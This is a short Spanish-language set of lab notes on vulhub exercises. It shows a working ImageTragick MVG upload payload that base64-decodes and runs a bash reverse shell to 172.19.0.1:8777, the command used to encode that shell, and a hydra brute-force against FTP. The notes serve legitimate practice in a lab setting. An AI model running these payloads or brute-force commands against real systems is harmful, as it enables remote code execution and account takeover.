### Imagemagick - vulhub github

SImplemente subiomos un archivo malicioso después de haber echo fuzzing con extensiones de archivo a ver cuále sacepta con esta wordlist -->https://github.com/maverickNerd/wordlists/blob/master/files/common-files.txt

Subimos este código 

`push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjEvODc3NyAwPiYx | base64 -d | bash`"||id " )'
pop graphic-context`

- Dónde lo que hay en base64 es
`/bin/bash -i >& /dev/tcp/172.19.0.1/8777 0>&1`

Así que utilizaremos echo -n para que no haya saltos de línea y lo meteremos al código anterior

`echo -n "/bin/bash -i >& /dev/tcp/172.19.0.1/8777 0>&1" | base64`

Nos ponemos en escucha, subimos archivo y powned
![[Pasted image 20250309173028.png]]

### FTP Vulnerable 

- sudo nmap -sVC -p21 127.0.0.1

Probamos a reventar la passwd suponiendo que nos sabemos el user

hydra -l sergio -P passwords.txt ftp://127.0.0.1 -t 15